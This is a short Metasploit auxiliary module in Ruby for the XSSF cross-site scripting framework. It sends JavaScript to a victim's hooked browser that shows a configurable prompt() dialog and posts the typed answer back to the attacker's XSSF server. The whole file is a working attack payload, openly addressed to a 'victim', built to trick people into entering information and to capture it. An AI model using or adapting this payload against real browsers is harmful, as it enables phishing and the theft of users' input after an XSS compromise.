require 'msf/core'
require 'xssf/xssfmaster'

#
# READ README_XSSF FILE FOR MORE INFORMATION ABOUT MODULES
#
class Metasploit3 < Msf::Auxiliary
	include Msf::Xssf::XssfServer
	
	# Module initialization
	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'PROMPT XSSF',
			'Description' => 'Simple XSSF prompt'
		))
		
		register_options(
			[
				OptString.new('PromptMessage', [true, 'Message you want to send to the victim.', 'Simple XSSF prompt test :'])
			], self.class
		)
	end
	
	# Part sent to the victim, insert your code here !!!
	def on_request_uri(cli, req)
		code = %Q{ XSSF_POST(prompt("#{datastore['PromptMessage']}","TEST"), '#{self.name}'); }
		
		send_response(cli, code)
	end
end